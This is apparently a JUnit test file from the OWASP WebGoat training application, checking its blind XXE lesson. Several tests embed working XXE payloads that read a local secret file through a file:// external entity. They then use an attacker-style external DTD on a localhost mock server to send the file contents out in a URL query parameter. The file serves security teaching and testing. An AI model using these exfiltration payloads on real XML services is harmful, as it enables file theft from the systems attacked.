package org.owasp.webgoat.lessons.xxe;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.github.tomakehurst.wiremock.WireMockServer;
import com.github.tomakehurst.wiremock.client.WireMock;
import com.github.tomakehurst.wiremock.verification.LoggedRequest;
import org.hamcrest.CoreMatchers;
import org.hamcrest.Matchers;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.owasp.webgoat.container.plugins.LessonTest;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import java.io.File;
import java.util.List;

import static com.github.tomakehurst.wiremock.client.WireMock.aResponse;
import static com.github.tomakehurst.wiremock.client.WireMock.getRequestedFor;
import static com.github.tomakehurst.wiremock.client.WireMock.urlMatching;
import static com.github.tomakehurst.wiremock.core.WireMockConfiguration.options;
import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

class BlindSendFileAssignmentTest extends LessonTest {

    private int port;
    private WireMockServer webwolfServer;

    @BeforeEach
    public void setup() {
        this.webwolfServer = new WireMockServer(options().dynamicPort());
        webwolfServer.start();
        this.port = webwolfServer.port();
        when(webSession.getCurrentLesson()).thenReturn(new XXE());
        this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac).build();
    }

    private int countComments() throws Exception {
        var response = mockMvc.perform(get("/xxe/comments").contentType(MediaType.APPLICATION_JSON))
                .andExpect(status().isOk())
                .andReturn();
        return new ObjectMapper().reader().readTree(response.getResponse().getContentAsString()).size();
    }

    private void containsComment(String expected) throws Exception {
        mockMvc.perform(get("/xxe/comments").contentType(MediaType.APPLICATION_JSON))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.[*].text").value(Matchers.hasItem(expected)));
    }

    @Test
    public void validCommentMustBeAdded() throws Exception {
        int nrOfComments = countComments();
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind")
                        .content("<comment><text>test</text></comment>"))

                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
        assertThat(countComments()).isEqualTo(nrOfComments + 1);
    }

    @Test
    public void wrongXmlShouldGiveErrorBack() throws Exception {
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind")
                        .content("<comment><text>test</ext></comment>"))

                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))))
                .andExpect(jsonPath("$.output", CoreMatchers.startsWith("javax.xml.bind.UnmarshalException\\n - with linked exception:\\n[javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,22]\\nMessage:")));
    }

    @Test
    public void simpleXXEShouldNotWork() throws Exception {
        File targetFile = new File(webGoatHomeDirectory, "/XXE/" + webSession.getUserName() + "/secret.txt");
        String content = "<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root SYSTEM \"file:///%s\"> ]><comment><text>&root;</text></comment>";
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind")
                        .content(String.format(content, targetFile.toString())))
                .andExpect(status().isOk());
        containsComment("Nice try, you need to send the file to WebWolf");
    }

    @Test
    public void solve() throws Exception {
        File targetFile = new File(webGoatHomeDirectory, "/XXE/" + webSession.getUserName() + "/secret.txt");
        //Host DTD on WebWolf site
        String dtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!ENTITY % file SYSTEM \"" + targetFile.toURI().toString() + "\">\n" +
                "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:" + port + "/landing?text=%file;'>\">\n" +
                "%all;";
        webwolfServer.stubFor(WireMock.get(WireMock.urlMatching("/files/test.dtd"))
                .willReturn(aResponse()
                        .withStatus(200)
                        .withBody(dtd)));
        webwolfServer.stubFor(WireMock.get(urlMatching("/landing.*")).willReturn(aResponse().withStatus(200)));

        //Make the request from WebGoat
        String xml = "<?xml version=\"1.0\"?>" +
                "<!DOCTYPE comment [" +
                "<!ENTITY % remote SYSTEM \"http://localhost:" + port + "/files/test.dtd\">" +
                "%remote;" +
                "]>" +
                "<comment><text>test&send;</text></comment>";
        performXXE(xml);
    }

    @Test
    public void solveOnlyParamReferenceEntityInExternalDTD() throws Exception {
        File targetFile = new File(webGoatHomeDirectory, "/XXE/" + webSession.getUserName() + "/secret.txt");
        //Host DTD on WebWolf site
        String dtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:" + port + "/landing?text=%file;'>\">\n";
        webwolfServer.stubFor(WireMock.get(WireMock.urlMatching("/files/test.dtd"))
                .willReturn(aResponse()
                        .withStatus(200)
                        .withBody(dtd)));
        webwolfServer.stubFor(WireMock.get(urlMatching("/landing.*")).willReturn(aResponse().withStatus(200)));

        //Make the request from WebGoat
        String xml = "<?xml version=\"1.0\"?>" +
                "<!DOCTYPE comment [" +
                "<!ENTITY % file SYSTEM \"" + targetFile.toURI() + "\">\n" +
                "<!ENTITY % remote SYSTEM \"http://localhost:" + port + "/files/test.dtd\">" +
                "%remote;" +
                "%all;" +
                "]>" +
                "<comment><text>test&send;</text></comment>";
        performXXE(xml);
    }

    private void performXXE(String xml) throws Exception {
        //Call with XXE injection
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind")
                        .content(xml))

                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));

        List<LoggedRequest> requests = webwolfServer.findAll(getRequestedFor(urlMatching("/landing.*")));
        assertThat(requests.size()).isEqualTo(1);
        String text = requests.get(0).getQueryParams().get("text").firstValue();

        //Call with retrieved text
        mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind")
                        .content("<comment><text>" + text + "</text></comment>"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.solved"))));
    }

}
